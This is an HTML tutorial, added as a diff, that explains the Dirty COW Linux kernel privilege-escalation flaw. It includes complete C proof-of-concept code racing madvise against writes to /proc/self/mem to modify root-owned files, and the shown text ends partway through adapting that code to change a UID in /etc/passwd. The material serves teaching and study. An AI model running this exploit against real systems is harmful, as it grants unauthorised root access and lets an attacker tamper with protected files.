@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>security_topic_paper</title>
+
+
+<style type="text/css">
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+p,
+blockquote {
+    margin: 0;
+    padding: 0;
+}
+body {
+    font-family: "Helvetica Neue", Helvetica, "Hiragino Sans GB", Arial, sans-serif;
+    font-size: 13px;
+    line-height: 18px;
+    color: #737373;
+    background-color: white;
+    margin: 10px 13px 10px 13px;
+}
+table {
+	margin: 10px 0 15px 0;
+	border-collapse: collapse;
+}
+td,th {
+	border: 1px solid #ddd;
+	padding: 3px 10px;
+}
+th {
+	padding: 5px 10px;
+}
+
+a {
+    color: #0069d6;
+}
+a:hover {
+    color: #0050a3;
+    text-decoration: none;
+}
+a img {
+    border: none;
+}
+p {
+    margin-bottom: 9px;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    color: #404040;
+    line-height: 36px;
+}
+h1 {
+    margin-bottom: 18px;
+    font-size: 30px;
+}
+h2 {
+    font-size: 24px;
+}
+h3 {
+    font-size: 18px;
+}
+h4 {
+    font-size: 16px;
+}
+h5 {
+    font-size: 14px;
+}
+h6 {
+    font-size: 13px;
+}
+hr {
+    margin: 0 0 19px;
+    border: 0;
+    border-bottom: 1px solid #ccc;
+}
+blockquote {
+    padding: 13px 13px 21px 15px;
+    margin-bottom: 18px;
+    font-family:georgia,serif;
+    font-style: italic;
+}
+blockquote:before {
+    content:"\201C";
+    font-size:40px;
+    margin-left:-10px;
+    font-family:georgia,serif;
+    color:#eee;
+}
+blockquote p {
+    font-size: 14px;
+    font-weight: 300;
+    line-height: 18px;
+    margin-bottom: 0;
+    font-style: italic;
+}
+code, pre {
+    font-family: Monaco, Andale Mono, Courier New, monospace;
+}
+code {
+    background-color: #fee9cc;
+    color: rgba(0, 0, 0, 0.75);
+    padding: 1px 3px;
+    font-size: 12px;
+    -webkit-border-radius: 3px;
+    -moz-border-radius: 3px;
+    border-radius: 3px;
+}
+pre {
+    display: block;
+    padding: 14px;
+    margin: 0 0 18px;
+    line-height: 16px;
+    font-size: 11px;
+    border: 1px solid #d9d9d9;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+}
+pre code {
+    background-color: #fff;
+    color:#737373;
+    font-size: 11px;
+    padding: 0;
+}
+sup {
+    font-size: 0.83em;
+    vertical-align: super;
+    line-height: 0;
+}
+kbd {
+  display: inline-block;
+  padding: 3px 5px;
+  font-size: 11px;
+  line-height: 10px;
+  color: #555;
+  vertical-align: middle;
+  background-color: #fcfcfc;
+  border: solid 1px #ccc;
+  border-bottom-color: #bbb;
+  border-radius: 3px;
+  box-shadow: inset 0 -1px 0 #bbb;
+}
+* {
+	-webkit-print-color-adjust: exact;
+}
+@media screen and (min-width: 914px) {
+    body {
+        width: 854px;
+        margin:10px auto;
+    }
+}
+@media print {
+	body,code,pre code,h1,h2,h3,h4,h5,h6 {
+		color: black;
+	}
+	table, pre {
+		page-break-inside: avoid;
+	}
+}
+</style>
+
+<style type="text/css">
+/**
+ * prism.js default theme for JavaScript, CSS and HTML
+ * Based on dabblet (http://dabblet.com)
+ * @author Lea Verou
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: black;
+	background: none;
+	text-shadow: 0 1px white;
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+pre[class*="language-"]::-moz-selection, pre[class*="language-"] ::-moz-selection,
+code[class*="language-"]::-moz-selection, code[class*="language-"] ::-moz-selection {
+	text-shadow: none;
+	background: #b3d4fc;
+}
+
+pre[class*="language-"]::selection, pre[class*="language-"] ::selection,
+code[class*="language-"]::selection, code[class*="language-"] ::selection {
+	text-shadow: none;
+	background: #b3d4fc;
+}
+
+@media print {
+	code[class*="language-"],
+	pre[class*="language-"] {
+		text-shadow: none;
+	}
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #f5f2f0;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: slategray;
+}
+
+.token.punctuation {
+	color: #999;
+}
+
+.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.boolean,
+.token.number,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #905;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #690;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string {
+	color: #a67f59;
+	background: hsla(0, 0%, 100%, .5);
+}
+
+.token.atrule,
+.token.attr-value,
+.token.keyword {
+	color: #07a;
+}
+
+.token.function {
+	color: #DD4A68;
+}
+
+.token.regex,
+.token.important,
+.token.variable {
+	color: #e90;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+</style>
+
+
+</head>
+
+<body>
+
+<h1 id="toc_0">Dirty COW (Copy-On-Write)</h1>
+
+<p><em>Linux Kernel Vulnerability Explanation and Tutorial by Jakub Hladik</em></p>
+
+<p><strong>November 17, 2017</strong></p>
+
+<h3 id="toc_1">Introduction</h3>
+
+<p>Dirty copy-on-write is a serious Linux kernel vulnerability which allows local privilege escalation through a race condition in the kernel&#39;s implementation of memory-management.</p>
+
+<p>The dirty copy-on-write exploit allows an attacker to gain a write access to read-only files. This can lead to escalating privileges on any device. After a successful exploit, which usually takes only a couple of seconds, an attacker can damage valuable files, rendering a device unusable, or gain root privileges and install malicious software into any device without the user ever knowing. The attacker has a root access to the entire device and therefore it is up to the attacker what to do with it.</p>
+
+<h3 id="toc_2">History</h3>
+
+<p>This security issue was discovered by a security researcher Phil Oester who was doing forensic analysis on some of his web servers and happened to find an executable exploit uploaded by an attacker. He was able to extract the version of GCC which compiled the source code. It turned out to be GCC 4.8.5 which was released on June 23, 2016, though this should not imply that the exploit was not available earlier. The vulnerability has existed since the Linux kernel version 2.6.22 released in 2007.</p>
+
+<h3 id="toc_3">Affected Systems</h3>
+
+<p>Every device running Linux kernel-based operating system, including servers, industrial computers, desktops, laptops, and mobile devices, with kernel version newer than 2.6.22 and older than 4.8.3 is affected unless the operating system is patched. Major Linux distributions provided patches only a couple of hours after the vulnerability was publicly disclosed on October 19, 2016. Linux kernel fix was released a day before the public disclosure as Paul Oester informed Linus Torvalds, the creator of Linux, about the vulnerability beforehand so that Linus can produce a patch for others to use.</p>
+
+<p>It is important to note that one of the most popular mobile operating systems, Android, running on more than 2 billion devices world-wide,  is also affected as it is based on the Linux kernel. As manufacturers have to create their own drivers for their smart phones, the release of new version of Android becomes somewhat complicated. One of the common scenarios is that Google, the creator and maintainer of Android, releases a new version, but it is up to the phone manufacturer or sometimes even the carrier when to release the update to their phones. This leaves countless users with a vulnerable phone in their pockets. Devices running Android version 5.1.1 or older, which accounts for 48.2% of all Android devices (as of November 2018), are susceptible to the attack.</p>
+
+<p>As of September 2017, more than 1,200 apps available in third-party market places contain dirty copy-on-write exploit to run text-based payment services to make fraudulent charges to the phone owner as reported by researchers of the antivirus firm Trend Micro.</p>
+
+<h3 id="toc_4">Security Impact</h3>
+
+<p>The severity of this vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195">CVE-2016-5195</a>) is high, as indicated by the CVSS (Common Vulnerability Scoring System) Base Score of 7.8 published by the NIST. The complexity of the attack is low, as well as the privileges required. The dirty copy-on-write vulnerability severely breaks all three classes of the CIA triad–confidentiality, integrity, and availability.</p>
+
+<h3 id="toc_5">Vulnerability</h3>
+
+<p>Linux kernel offers system calls for mapping files from disks into the memory for cases where we need to open a file that is very large or when we need to share a file resource between two processes. The system calls involved in the dirty copy-on-write are <code>mmap()</code>, <code>madvise()</code>, and <code>write()</code>. The system call <code>mmap()</code> tells the kernel to map a file to a memory region, <code>madvise()</code> informs the kernel what the intended future use for that memory region is, and <code>write()</code> tells the kernel to write bytes into the memory region. It is important to note that most of these system calls are not atomic. That means, in a multi-threaded program, we can have a context switch happen in middle of a <code>write()</code> operation. It is this non-atomic nature of the <code>write()</code> call for writing into a memory-mapped read-only file and insufficient programmatic check for the race condition which causes the dirty copy-on-write vulnerability to exist.</p>
+
+<p>Before we dive too deep into the theory and let&#39;s look at how memory mapping works and explore the entire vulnerability below</p>
+
+<h3 id="toc_6">Setup</h3>
+
+<p>The tutorial provided is a set of three programs that will help you understand the copy-on-write exploit.</p>
+
+<p>You will need a virtual machine running the unpatched version of the vulnerable Linux kernel. I successfully tested the code on 64-bit Ubuntu Desktop 16.04.1. This version of Ubuntu is running Linux kernel version 4.4.0. The distribution iso image is available <a href="http://old-releases.ubuntu.com/releases/16.04.0/ubuntu-16.04.1-desktop-amd64.iso">here</a>.</p>
+
+<p>Before you first start your virtual machine, make sure to disable the &quot;virtual&quot; network adapter in the virtual machine settings. This will prevent Ubuntu from receiving the important security update which triggers automatically.</p>
+
+<p>After you install Ubuntu, go to Settings-&gt;Software &amp; Updates-&gt;Updates (tab) and in &quot;When there are security updates&quot; select &quot;Display immediately&quot; instead of &quot;Download and install immediately&quot;. Confirm it with OK. This will prevent Ubuntu from installing the kernel patch thus making dirty copy-on-write impossible.</p>
+
+<p>Now you can shut the virtual machine off and go back into the machine&#39;s settings and re-enable the network adapter to gain internet access on your machine.</p>
+
+<p>Now that you have a vulnerable virtual system running, let&#39;s get to programming.</p>
+
+<h4 id="toc_7">Mapping Files to Memory</h4>
+
+<p>The system call <code>mmap()</code> maps a file directly into our memory. In the example below, we will open a file called <code>test</code> which you have to create and place it to the directory where your executable resides. Feel free to put any contents into the file. You can create a file with dummy content by running the following:</p>
+
+<div><pre><code class="language-bash">$ echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &gt; test</code></pre></div>
+
+<p>You can verify the contents of the file by running the following command, obtaining the content.</p>
+
+<div><pre><code class="language-bash">$ cat test
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre></div>
+
+<p>Now, read through the program and try to understand what is happening.</p>
+
+<div><pre><code class="language-c">// mmap.c
+// example of using mmap to read and write file content
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define CONTENT_LENGTH 40
+#define CONTENT_OFFSET 5
+
+int main() 
+{
+  struct stat st;
+  char content[CONTENT_LENGTH];
+  char *new_content = &quot;---written using mmap---&quot;;
+  void *map;
+
+  // get file descriptor, read and write access mode
+  int f = open(&quot;./test&quot;, O_RDWR);
+  // get file status
+  fstat(f, &amp;st);
+ 
+  // map file &quot;test&quot; into memory 
+  map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0);
+ 
+  // perform memcpy from the mapped region to our string 
+  memcpy((void *)(content), map, CONTENT_LENGTH);
+  printf(&quot;reading: %s\n&quot;, content);
+
+  // perform memcpy from new_content to the mapped region
+  memcpy(map + CONTENT_OFFSET, (void *)(new_content), strlen(new_content));
+
+  // unmap the region and close the file
+  munmap(map, st.st_size);
+  close(f);
+  return 0;
+}
+</code></pre></div>
+
+<p>You can compile and run this file with:</p>
+
+<div><pre><code class="language-bash">$ gcc -o mmap mmap.c
+$ ./mmap</code></pre></div>
+
+<p>Let&#39;s analyze this program in sections.</p>
+
+<div><pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;</code></pre></div>
+
+<p>These are the header files needed for memory mapping and file operations.</p>
+
+<div><pre><code class="language-c">#define CONTENT_LENGTH 40
+#define CONTENT_OFFSET 5</code></pre></div>
+
+<p>The defines are help us make code more reusable. We use the <code>CONTENT_LENGTH</code> to define how big of a buffer we need for reading. We could define it after we get the size of the target file but I wanted to keep the code as simple as possible so it is defined statically here.</p>
+
+<p><code>CONTENT_OFFSET</code> defines how far into the file we want to start writing our message. If the offset is 5, the the code will preserve the first &#39;aaaaa&#39; and then start overwriting the file.</p>
+
+<div><pre><code class="language-c">struct stat st;</code></pre></div>
+
+<p>Declares structure to hold file status–file inode information including file size, permissions, etc.</p>
+
+<div><pre><code class="language-c">char content[CONTENT_LENGTH];</code></pre></div>
+
+<p>Buffer for reading.</p>
+
+<div><pre><code class="language-c">char *new_content = &quot;---written using mmap---&quot;;</code></pre></div>
+
+<p>Content to be written into the memory-mapped file.</p>
+
+<div><pre><code class="language-c">void *map;</code></pre></div>
+
+<p>Pointer to hold the pointer pointing to the memory region where the kernel mapped the file to.</p>
+
+<div><pre><code class="language-c">  int f = open(&quot;./test&quot;, O_RDWR);</code></pre></div>
+
+<p>Gets file descriptor for the file <code>test</code> in read and write mode (<code>O_RDWR</code>).</p>
+
+<div><pre><code class="language-c">fstat(f, &amp;st);</code></pre></div>
+
+<p>Gets the file status and saves it in <code>st</code>. We do this to obtain the file size.</p>
+
+<div><pre><code class="language-c">map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0);</code></pre></div>
+
+<p>Map the file <code>test</code> into the memory in <code>MAP_SHARED</code> mode, with read and write protection (discussed later).</p>
+
+<div><pre><code class="language-c">memcpy((void *)(content), map, CONTENT_LENGTH);
+printf(&quot;reading: %s\n&quot;, content);</code></pre></div>
+
+<p>Copy <code>CONTENT_LENGTH</code>-many bytes from the memory-mapped file memory location into our buffer <code>content</code>. Since we mapped the file into memory, we can use regular memory operation to access and write the content. Finally, the <code>printf()</code> statement prints out the contents of the buffer.</p>
+
+<div><pre><code class="language-c">memcpy(map + CONTENT_OFFSET, (void *)(new_content), strlen(new_content));</code></pre></div>
+
+<p>Copy the <code>new_content</code> buffer bytes into our memory-mapped file memory location starting at offset <code>CONTENT_OFFSET</code>.</p>
+
+<div><pre><code class="language-c">munmap(map, st.st_size);
+close(f);
+return 0;</code></pre></div>
+
+<p>Clean up after we are done. <code>munmap()</code> tells the kernel that we are done with the memory mapping and the memory space allocated for the file can be used for something else. <code>close(f)</code> gets rid of the file descriptor and finally <code>return</code> terminates the process.</p>
+
+<p>To understand what is going on when we call mmap(), lets look at the situation graphically.</p>
+
+<p><img src="./map.png" alt="Mapping to memory"></p>
+
+<p>As you can see the file is mapped from its origin (disk) into memory using the <code>mmap()</code> system call. <code>mmap()</code> returns a pointer which points to the first byte of the memory region where the file is mapped. Do not forget that the addresses we deal with in the computer are virtual addresses and have to go through address translation process during run-time to get the actual physical address of where in memory the file contents resides. We will get back to the address translation later.</p>
+
+<p>When we write into the memory location where the file contents is mapped to, the memory map gets flagged as modified and it is the responsibility of the operating system to write it back to the disk. This operation happens on <code>unmap()</code> system call. The operating system now nows we are done with the memory map and check whether it has been modified. Since we opened the map in <code>MAP_SHARED</code> mode and <code>PROT_WRITE</code> protection, it gets written back to the disk.</p>
+
+<h4 id="toc_8">Private Mapping of Read-Only Files</h4>
+
+<p>Let&#39;s do an experiment with a read-only file to gain a little more knowledge before attempting the exploit. The code is fairly similar to the code we have already ran, but there are a few differences.</p>
+
+<p>We will need to create a read-only file. The simplest way to do so is to create a file as a root. You can run the following to create a read-only file.</p>
+
+<div><pre><code class="language-bash">$ su -c &quot;echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &gt; test&quot;</code></pre></div>
+
+<p>Now we can check that the file <code>test</code> is truly read-only.</p>
+
+<div><pre><code class="language-bash">$ ls -l test
+-rw-r--r-- 1 root root 29 Nov 17 02:24 test</code></pre></div>
+
+<p>We can also attempt to write into it as a regular user.</p>
+
+<div><pre><code class="language-bash">$ echo &quot;lets write readonly&quot; &gt; test
+bash: test: Permission denied</code></pre></div>
+
+<p>As expected, we cannot write to a read-only file as a regular user. </p>
+
+<p>Let&#39;s look at the following code now.</p>
+
+<div><pre><code class="language-c">// mmap_private.c
+// example of using mmap create a read-only file mapping
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+
+#define CONTENT_LENGTH 40
+#define CONTENT_OFFSET 5
+
+int main() 
+{
+  struct stat st;
+  char content[CONTENT_LENGTH];
+  char *new_content = &quot;---written using mmap---&quot;;
+  void *map;
+
+  // get file descriptor, readonly access mode
+  int f = open(&quot;./test&quot;, O_RDONLY);
+  // get file status
+  fstat(f, &amp;st);
+ 
+  // map file &quot;test&quot; into memory 
+  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+  //map = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, f, 0);
+  int fm = open(&quot;/proc/self/mem&quot;, O_RDWR);
+  
+  // read bytes from memory into content
+  lseek(fm, (uintptr_t) map, SEEK_SET);
+  read(fm, content, st.st_size); content[CONTENT_LENGTH-1] = &#39;\0&#39;;
+  printf(&quot;reading: %s\n&quot;, content); 
+  
+
+  // write bytes starting at CONTENT_OFFSET into memory
+  lseek(fm, (uintptr_t) map + CONTENT_OFFSET, SEEK_SET);  
+  int result = write(fm, new_content, strlen(new_content));
+  if (result == -1) printf(&quot;write failed\n&quot;);
+  else printf(&quot;write successful\n&quot;);
+  
+
+  // read changed bytes from memory into content
+  lseek(fm, (uintptr_t) map, SEEK_SET);
+  read(fm, content, st.st_size); content[CONTENT_LENGTH-1] = &#39;\0&#39;;
+  printf(&quot;reading: %s\n&quot;, content);
+
+  // tell the kernel we dont need this page anymore
+  madvise(map, CONTENT_LENGTH, MADV_DONTNEED);
+  
+  // unmap the region and close the file
+  munmap(map, st.st_size);
+  close(f);
+  return 0;
+}</code></pre></div>
+
+<p>You can compile and run this file with:</p>
+
+<div><pre><code class="language-bash">$ gcc -o mmap_private mmap_private.c
+$ ./mmap_private</code></pre></div>
+
+<p>Let&#39;s analyze the differences from the previous code.</p>
+
+<div><pre><code class="language-c">map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);</code></pre></div>
+
+<p>This time we are opening a read-only file. Therefore, we need to open it appropriately, otherwise the kernel will not allow us to map it. We are using <code>PROT_READ</code> to signify we only need a read right to the memory map and <code>MAP_PRIVATE</code> to signify that the mapping is private. More on this later.</p>
+
+<div><pre><code class="language-c">int fm = open(&quot;/proc/self/mem&quot;, O_RDWR);</code></pre></div>
+
+<p>In Linux operating system, almost everything acts as file that we can write and read out of for simplicity, even devices. Here, we are getting a file descriptor for memory of our own process. We are asking for read and write access. This is necessary because we will be writing into a &quot;read-only&quot; mapping. If we used memcpy, the operating system would complain because it knows we cannot write into it. However, if we write into the memory on the low-level, it will actually write into the memory. Do not get too excited, because the Linux kernel will not allow to write it back into the file.</p>
+
+<div><pre><code class="language-c">lseek(fm, (uintptr_t) map, SEEK_SET);</code></pre></div>
+
+<p>To be able to use the <code>read()</code> system call which follows shortly, we need to tell the <code>read()</code> where to start. This is done by calling <code>lseek()</code> system call and the virtual address–our map pointer.</p>
+
+<div><pre><code class="language-c">read(fm, content, st.st_size);</code></pre></div>
+
+<p>Read <code>st.st_size</code>-many bytes (file length) from fm (our memory) into the buffer <code>content</code>. We print the buffer and you see that we read our file.</p>
+
+<div><pre><code class="language-c">int result = write(fm, new_content, strlen(new_content));</code></pre></div>
+
+<p>Now, after re-seeking to our <code>CONTENT_OFFSET</code> we are going to write into the memory. We save the status of the operation into variable <code>result</code> to check whether the <code>write()</code> was successful.</p>
+
+<p>After the write, we read the memory again into our buffer and you see that we over wrote the contents in that memory area. Wohoo! Well, maybe not. We will see.</p>
+
+<div><pre><code class="language-c">madvise(map, CONTENT_LENGTH, MADV_DONTNEED);</code></pre></div>
+
+<p>This line is not as important in this example but it will be very soon. <code>madvise()</code> tells the kernel that the area pointed to by map, spanning over <code>CONTENT_LENGTH</code> bytes is not needed at this point and the kernel&#39;s page replacement algorithm can take that into consideration when replacing pages. This system call is available purely for performance increase and it is not generally needed. However, we will use it in our exploit later.</p>
+
+<p>Alright, let&#39;s see how we wrote into our read-only file as a regular user. Let&#39;s run the following command and observe the contents of the file <code>test</code>.</p>
+
+<div><pre><code class="language-bash">$ cat test
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre></div>
+
+<p>What? Why didn&#39;t it work? Well, it&#39;s not as simple to trick the Linux kernel to do something sinister.</p>
+
+<p>Remember the <code>MAP_PRIVATE</code> when we called <code>mmap()</code>? When we create a private mapping of memory and attempt to write into it, the operating system will create a copy of the memory-mapped file memory location and we are only writing into the copy. This is called <strong>copy-on-write</strong>. Now you know what the &quot;cow&quot; is all about.</p>
+
+<p>When we are done with this private copy, the operating system simply discards it because this copy is not directly related to the file on the disk. Then it looks at the original and since it has not been modified (&quot;<strong>dirty</strong>&quot; in operating system jargon means modified whereas clean means untouched), no change on disk is necessary. Hopefully the term &quot;dirty cow&quot; makes more sense now.</p>
+
+<p>Let&#39;s illustrate what happens after we call <code>write()</code>.</p>
+
+<p><img src="./cow.png" alt="Mapping to memory"></p>
+
+<p>Everything else stays the same as it was in the previous code example until we call <code>write()</code>. Since the mapping is private, a <code>write()</code> will cause a copy-on-write. In other words, the kernel will provide us a copy to write into. Now it is important to realize that the physical address of the copy is different from the original but the virtual is not. The virtual address saved in our <code>map</code> pointer stays the same but the translated physical address is now different. The <code>write()</code> change is signified in red in the drawing. When we call either <code>madvise()</code> or <code>unmap()</code>, the following happens.</p>
+
+<p><img src="./cleanup.png" alt="Mapping to memory"></p>
+
+<p>The copy gets discarded, the pointer now points to the original address, the kernel checks whether there are any changes to be written to disk (no changes in our case because we only wrote to the copy) and the file contents is deallocated from the memory.</p>
+
+<p>This explains why we were able to write into the memory and yet we did not change the contents of the file. Let&#39;s add threads to be able to change the contents of a read-only file.</p>
+
+<h4 id="toc_9">Racing Threads</h4>
+
+<p>In this example, we are actually going to write into a read-only file. The <code>write_thread</code> is running <code>write()</code> which writes into the memory-mapped file memory location. Note that the write operation is not an atomic operation.
+At the same time, the <code>madvise_thread</code> is constantly running <code>madvise()</code> to tell the kernel that the section of allocated memory is not needed and can be freed the future.</p>
+
+<div><pre><code class="language-c">// racing.c
+// example of writing into a read-only file
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+
+// read-only file we want to write into
+#define CONTENT_FILE &quot;test&quot;
+// string to write
+#define CONTENT_STRING &quot;---THIS WAS WRITTEN BY DIRTY COW---&quot;
+// byte offset of the starting location to write to 
+#define CONTENT_OFFSET 10
+
+void *map;
+pthread_t write_thread, madvise_thread;
+struct stat st;
+char *new_content = CONTENT_STRING;
+
+void *madvise_worker(void *arg)
+{
+  while(1) {
+    // tell the kernel that the memory-mapped file memory
+    // section is no longer needed and can be freed
+    madvise(map, st.st_size, MADV_DONTNEED);
+  }
+}
+
+void *write_worker(void *arg)
+{
+  // open memory file descriptor in read-write mode
+  int f = open(&quot;/proc/self/mem&quot;, O_RDWR);
+  
+  while(1) {
+    // find the offset we are interested in writing
+    lseek(f, (uintptr_t) map + CONTENT_OFFSET, SEEK_SET);
+    // write new_contents starting at the current offset
+    write(f, new_content, strlen(new_content));
+  }
+}
+
+int main()
+{
+  // get the file descriptor, read-only mode
+  int f = open(CONTENT_FILE, O_RDONLY);
+  // get file status (we need size)
+  fstat(f, &amp;st);
+  
+  // map file to memory, in read-only and private mode
+  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+  // create threads
+  pthread_create(&amp;write_thread, NULL, write_worker, NULL);
+  pthread_create(&amp;madvise_thread, NULL, madvise_worker, NULL);
+
+  // wait for the threads to finish
+  pthread_join(write_thread, NULL);
+  pthread_join(madvise_thread, NULL);
+
+  return 0;
+}</code></pre></div>
+
+<p>The code should be self-explanatory so let&#39;s run it right away.  We will analyze the program on thread-level later.</p>
+
+<p>Compile this file with:</p>
+
+<div><pre><code class="language-bash">$ gcc -o racing racing.c -lpthread</code></pre></div>
+
+<p>You will also need a testing file. To make file truly read-only, create the file as root.</p>
+
+<div><pre><code class="language-bash">$ su -c &quot;echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &gt; test&quot;</code></pre></div>
+
+<p>Now we can check that the file <code>test</code> is truly read only.</p>
+
+<div><pre><code class="language-bash">$ ls -l test
+-rw-r--r-- 1 root root 29 Nov 17 02:24 test</code></pre></div>
+
+<p>We can also attempt to write into it as a regular user.</p>
+
+<div><pre><code class="language-bash">$ echo &quot;lets write readonly&quot; &gt; test
+bash: test: Permission denied</code></pre></div>
+
+<p>And finally, let&#39;s just make sure the file contains what we wrote into it.</p>
+
+<div><pre><code class="language-bash">$ cat test
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre></div>
+
+<p>Now, you can run the program.</p>
+
+<div><pre><code class="language-bash">$ ./racing</code></pre></div>
+
+<p>After three seconds or so, press <code>Ctrl+C</code> to kill the program. Now show the contents of the test file and check the permissions. It should be the following.</p>
+
+<div><pre><code class="language-bash">$ cat test
+aaaaaaaaaa---THIS WAS WRITTEN BY DIRTY COW---aaaaaaaaaaa
+$ ls -l test
+-rw-r--r-- 1 root root 29 Nov 17 02:24 test</code></pre></div>
+
+<p>Wow! We have written stuff into a read-only, root-owned file as a regular user! How is that possible? Let&#39;s talk about what is happening behind the scenes.</p>
+
+<p>After you run the program, two threads will start running concurrently. Let&#39;s go over what each thread does.</p>
+
+<p><code>write_thread</code> does the following:</p>
+
+<ol>
+<li>Since we are attempting to write in <code>MAP_PRIVATE</code> mode, write will first create a private copy of the memory-mapped file and change the mapping of the virtual address to the newly mapped private copy physical address.</li>
+<li>Write data into the memory location pointed by map. In this case, it is the private copy.</li>
+</ol>
+
+<p><code>madvise_thread</code> does the following:</p>
+
+<ol>
+<li>Let the operating system know that the memory map is no longer needed and it may be freed in the future. The operating system may free it right away or some time in the future.</li>
+</ol>
+
+<p>This process repeats forever until we kill the program. However, we are looking for a specific sequence of context switches which allows us to exploit the racing condition.</p>
+
+<p>The non-atomic nature of the <code>write()</code> operation inside the <code>write_thread</code> can cause a context switch from the <code>write_thread</code> to <code>madvise_thread</code> after the kernel creates a private copy (1) and before the actual write into the private copy happens (2). Next, the <code>madvise_thread</code> will &quot;deallocate&quot; the private copy by changing the mapping of virtual address to the old, original physical address of the memory-mapped file location which should be read-only. If we get another context switch to occur after the physical address has been updated from the private copy to the original location, <code>write_thread</code> will take over and perform a write into the <strong>same</strong> virtual address but different physical address that it originally intended thanks to <code>madvise_thread</code>.</p>
+
+<p>The vulnerability in the memory mapped <code>write()</code> is due to the absence of checking whether the memory page that is being checked for dirtiness had a copy that was previously deallocated. Linus Torvalds added a new flag and checking for this state into the code which deals with the copy-on-write to fix this vulnerability. You can find Linus&#39; git commit which fixed the issue <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">here</a>. This fix is included in the Linux kernel since version 4.8.3.</p>
+
+<h4 id="toc_10">Escalating Privileges With Racing Threads</h4>
+
+<p>We can modify the program to gain root privileges. To do that, we will need to modify UID inside the <code>/etc/passwd</code> file. Locate your user entry in the <code>/etc/passwd</code>. You can use the following command:</p>
+
+<div><pre><code class="language-bash">$ cat /etc/passwd | grep -b &lt;&lt;your_username&gt;&gt;</code></pre></div>
+
+<p><code>grep</code> will return the byte offset of the first character on the line. We are interested in the byte offset of the first decimal number on that line. This number is the UID (User ID) and we need to change it to 0 to become root. Since we know the byte offset of the first character of the line, simply start counting at that number and count up to the first digit of the number, this is our byte offset. You can verify the byte offset is correct with the following command:</p>
+
+<div><pre><code class="language-bash">$ dd if=/etc/passwd bs=1 count=4 status=none skip=&lt;&lt;your_offset&gt;&gt;</code></pre></div>
+
+<p>Make sure to change the count to how many digits your UID is. It is a four digit number in most cases. Once you verified your offset, enter it in the <code>CONTENT_OFFSET</code> in the <code>racing.c</code> file to whatever your byte offset is. Next, change the <code>CONTENT_STRING</code> to <code>0000</code> or how many digits your original UID is.
+The top of the file <code>racing.c</code> should now look something like this:</p>
+
+<div><pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+
+// read-only file we want to write into
+#define CONTENT_FILE &quot;/etc/passwd&quot;
